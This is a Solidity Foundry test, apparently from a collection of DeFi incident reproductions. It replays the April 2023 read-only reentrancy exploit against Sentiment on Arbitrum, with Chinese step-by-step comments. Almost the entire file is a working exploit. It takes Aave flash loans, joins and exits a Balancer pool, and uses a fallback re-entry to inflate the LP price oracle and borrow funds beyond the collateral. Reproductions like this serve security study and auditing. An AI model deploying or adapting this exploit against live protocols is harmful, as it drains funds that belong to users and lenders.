// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./../utils/interface.sol";

// @Incident
// 2023-04-05 Sentiment(Arbitrum) Read-Only-Reentrancy

// @KeyInfo - Total Lost : ~1M US$
// Attacker : 0xdd0cdb4c3b887bc533957bc32463977e432e49c3
// Attack Contract : 0x9f626f5941fafe0a5b839907d77fbbd5d0dea9d0
// Vulnerable Contract : 0x62c5aa8277e49b3ead43dc67453ec91dc6826403
// Attack Tx : 0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d

// @Info
// Vulnerable Contract Code : https://arbiscan.deth.net/address/0x16f3ae9c1727ee38c98417ca08ba785bb7641b5b

// @Analysis
// Myself : 
// https://www.google.com/
// Twitter : 
// https://twitter.com/peckshield/status/1643417467879059456
// https://twitter.com/spreekaway/status/1643313471180644360
// Others :
// https://s.foresightnews.pro/article/detail/32601
// https://web3caff.com/archives/57127
// https://medium.com/zokyo-io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334

// @Summary
// 本次攻击的核心在于攻击者利用Banlancer的view函数进行只读重入，在池余额未更新之前执行fallback恶意代码，操纵价格预言机，实现获利。

interface IWeightedBalancerLPOracle {
    function getPrice(address token) external view returns (uint256);
}

interface IAccountManager {
    function riskEngine() external;

    function openAccount(address owner) external returns (address);

    function borrow(
        address account,
        address token,
        uint256 amt
    ) external;

    function deposit(
        address account,
        address token,
        uint256 amt
    ) external;

    function exec(
        address account,
        address target,
        uint256 amt,
        bytes calldata data
    ) external;

    function approve(
        address account,
        address token,
        address spender,
        uint256 amt
    ) external;
}

interface IBalancerToken is IERC20 {
    function getPoolId() external view returns (bytes32);
}

// 攻击合约
contract ContractTest is Test {
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    address FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;

    IBalancerToken TokenPair = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595); // Balancer 33 WETH 33 WBTC 33 USDC (B-33WETH-...)
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); // Balancer: Vault
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD); // Aave: Pool V3
    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403); // Proxy_62c5_6403
    IWeightedBalancerLPOracle WeightedBalancerLPOracle = IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B); // WeightedBalancerLPOracle
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address account;
    bytes32 PoolId;
    uint256 nonce;
    
    function setUp() public {
        // fork主网环境
        vm.createSelectFork("arbitrum", 77_026_912);
        // 对应的地址打印为相关标签
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(FRAX), "FRAX");
        cheats.label(address(account), "account");
        cheats.label(address(BalancerVault), "BalancerVault");
        cheats.label(address(AaveV3), "AaveV3");
        cheats.label(address(TokenPair), "TokenPair");
        cheats.label(address(AccountManager), "AccountManager");
        cheats.label(address(WeightedBalancerLPOracle), "WeightedBalancerLPOracle");
    }
    
    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);

        console.log("\n[@Before flashloan]");
        console.log("Before flashloan Starting, Attack Contract of WBTC:", WBTC.balanceOf(address(this)));
        console.log("Before flashloan Starting, Attack Contract of WETH:", WETH.balanceOf(address(this)));
        console.log("Before flashloan Starting, Attack Contract of USDC:", USDC.balanceOf(address(this)));
        console.log("Before flashloan Starting, Attack Contract of USDT:", USDT.balanceOf(address(this)));

        AccountManager.riskEngine();

        // step1 ：攻击者向Aave V3 借款闪电贷
        address[] memory assets = new address[](3); // 代币资产
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC);

        uint[] memory amounts = new uint[](3); // 代币数量
        amounts[0] = 606 * 1e8;
        amounts[1] = 10_050_100 * 1e15;
        amounts[2] = 18_000_000 * 1e6;

        uint[] memory interestRateModes = new uint[](3); // aave中的闪电贷模式，这里是一般性归还闪电贷
        interestRateModes[0]=0;
        interestRateModes[1]=0;
        interestRateModes[2]=0;

        AaveV3.flashLoan(address(this), assets, amounts, interestRateModes, address(this), abi.encode(''), 0);

        console.log("\n[@Profit]");
        emit log_named_decimal_uint("After Read-Only-Reentrancy, Attack Contract Get Profit of WBTC", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("After Read-Only-Reentrancy, Attack Contract Get Profit of WETH", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("After Read-Only-Reentrancy, Attack Contract Get Profit of USDC", USDC.balanceOf(address(this)), USDC.decimals());
        emit log_named_decimal_uint("After Read-Only-Reentrancy, Attack Contract Get Profit of USDT", USDT.balanceOf(address(this)), USDT.decimals());
    }

    // step2 ： 闪电贷逻辑过程中，触发攻击合约自定义的执行操作函数（必须有，不然会回滚）
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata /*premiums*/,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external payable returns (bool) {

        Firstdeposit_to_Sentiment(assets);
        joinPool(assets);
        exitPool();

        WETH.approve(address(AaveV3), type(uint256).max);
        WBTC.approve(address(AaveV3), type(uint256).max);
        USDC.approve(address(AaveV3), type(uint256).max);
        return true; // 返回true确保aave闪电贷逻辑正常执行
    }

    //  step3 ： 攻击合约在Sentiment中创建账户，并授权50以太WETH，在Balancer协议的池子中存入这些资产
    function Firstdeposit_to_Sentiment(address[] calldata assets) internal {
        emit log_named_decimal_uint("\n[@LP Price]", WeightedBalancerLPOracle.getPrice(address(TokenPair)), 18);
        emit log_named_decimal_uint("\nETH balance", address(this).balance, 18);
        WETH.withdraw(100 * 1e15); // 取出0.1 ETH，攻击合约第一次fallback
        console.log("Firstly fallback!");

        account = AccountManager.openAccount(address(this)); // BeaconProxy
        WETH.approve(address(AccountManager), 50 * 1e18);

        AccountManager.deposit(account, address(WETH), 50 * 1e18);
        AccountManager.approve(account, address(WETH), address(BalancerVault), 50 * 1e18);

        PoolId = TokenPair.getPoolId(); // 等比例权重池的ID

        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 0;
        amountIn[1] = 50 * 1e18;
        amountIn[2] = 0;
        bytes memory userdata = abi.encode(uint8(1), amountIn, uint256(0));   
        IBalancerVault.JoinPoolRequest memory request1 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userdata,
            fromInternalBalance: false
        });
        // data 可根据 cast 4byte-decode 0x... 进行解析得到
        bytes memory data = abi.encodeWithSelector(BalancerVault.joinPool.selector, PoolId, account, account, request1);
        AccountManager.exec(account, address(BalancerVault), 0, data); // 实现存款50 WETH

        console.log("\n[@Step 3,About Attack Contract]");
        emit log_named_decimal_uint("WBTC", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("WETH", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("USDC", USDC.balanceOf(address(this)), USDC.decimals());
    }

    //  step4 ： 攻击合约绕过Sentiment中，在Balancer协议的pair中存入10000WETH，606WBTC，18000000USDC
    function joinPool(address[] calldata assets) internal {
        WETH.approve(address(BalancerVault), 10_000 * 1e18);
        USDC.approve(address(BalancerVault), 18_000_000 * 1e6);
        WBTC.approve(address(BalancerVault), 606 * 1e18);

        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 606 * 1e8;
        amountIn[1] = 10_000 * 1e18;
        amountIn[2] = 18_000_000 * 1e6;
        bytes memory userdata = abi.encode(uint8(1), amountIn, uint256(0));   
        IBalancerVault.JoinPoolRequest memory request2 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userdata,
            fromInternalBalance: false
        });
        // 传入value，第二次触发fallback
        BalancerVault.joinPool(PoolId, address(this), address(this), request2); 
        //BalancerVault.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), request2); // 分析第196行，三种代币转账到池子
        console.log("Senondly fallback!");
        emit log_named_decimal_uint("\n[@Before Read-Only-Reentrancy LP Price]", WeightedBalancerLPOracle.getPrice(address(TokenPair)), 18);

        console.log("\n[@Step 4,About Attack Contract]");
        emit log_named_decimal_uint("WBTC", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("WETH", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("USDC", USDC.balanceOf(address(this)), USDC.decimals());
    }

    //  step5 ： 攻击合约从Balancer协议的pair中取款，但是取款WETH的时候触发了fallback
    function exitPool() internal {
        TokenPair.approve(address(BalancerVault), 0);

        address[] memory assetsOut = new address[](3);
        assetsOut[0] = address(WBTC);
        assetsOut[1] = address(0);
        assetsOut[2] = address(USDC);

        uint256[] memory amountOut = new uint256[](3);
        amountOut[0] = 606 * 1e8;
        amountOut[1] = 5000 * 1e18;
        amountOut[2] = 9_000_000 * 1e6;

        uint256 balancerTokenAmount = TokenPair.balanceOf(address(this));
        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);
        IBalancerVault.ExitPoolRequest memory request = IBalancerVault.ExitPoolRequest({
            asset: assetsOut,
            minAmountsOut: amountOut,
            userData: userDatas,
            toInternalBalance: false
        });
        BalancerVault.exitPool(PoolId, address(this), payable(address(this)), request); // 分析第250行

        emit log_named_decimal_uint("\n[@After Read-Only-Reentrancy LP Price]", WeightedBalancerLPOracle.getPrice(address(TokenPair)), 18);

        console.log("\n[@Step 5,About Attack Contract]");
        emit log_named_decimal_uint("WBTC", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("WETH", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("USDC", USDC.balanceOf(address(this)), USDC.decimals());

        address(WETH).call{value: address(this).balance}("");
    }


    fallback() external payable {
        console.log("\n[@fallback!]");
        console.log("fallback called, nonce =", nonce);
        console.log("msg.sender:", msg.sender); 
        //console.log(">> current balance = ", address(this).balance);
        emit log_named_decimal_uint("ETH balance", address(this).balance, 18);
        if (nonce == 1) {
            console.log("Thirdly fallback!");
            Borrow();
            emit log_named_decimal_uint("\n[@During Read-Only-Reentrancy LP Price]", WeightedBalancerLPOracle.getPrice(address(TokenPair)), 18);
        }
        nonce++;
    }


    function Borrow() internal {
        // 借款，这里发生只读重入，操纵预言机价格，可以借更多
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);

        // 兑换FRAX
        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);
        bytes memory execData = abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1);
        AccountManager.exec(account, FRAXBP, 0, execData);

        AccountManager.approve(account, address(USDC), address(AaveV3), type(uint256).max);
        AccountManager.approve(account, address(USDT), address(AaveV3), type(uint256).max);
        AccountManager.approve(account, address(WETH), address(AaveV3), type(uint256).max);

        // 放入aave并取出
        // execData的内容可以根据给出的data，然后使用foundry命令 cast 4byte-decode 0x11111 来解析出来
        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDC), 580_000 * 1e6, account, 0));
        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDT), 360_000 * 1e6, account, 0));
        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(WETH), 80 * 1e18, account, 0));

        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDC), type(uint256).max, address(this)));
        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDT), type(uint256).max, address(this)));
        AccountManager.exec(account, address(AaveV3), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(WETH), type(uint256).max, address(this)));
    }
}